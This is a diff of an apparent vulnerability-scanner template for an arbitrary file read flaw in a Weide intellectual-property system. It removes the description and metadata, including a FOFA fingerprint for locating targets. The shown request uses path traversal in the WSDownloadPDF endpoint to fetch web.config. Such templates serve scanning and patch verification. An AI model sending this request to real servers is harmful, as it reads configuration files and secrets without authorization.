@@ -3,12 +3,8 @@ info:
   name: 唯徳知识产权-WSDownloadPDF任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bqlpxutghnd9bnqy'
+  description: ''
   tags: lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bqlpxutghnd9bnqy
-    fofa: body="JSCOMM/language.js"
 http:
 - raw:
   - 'GET /wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config HTTP/1.1
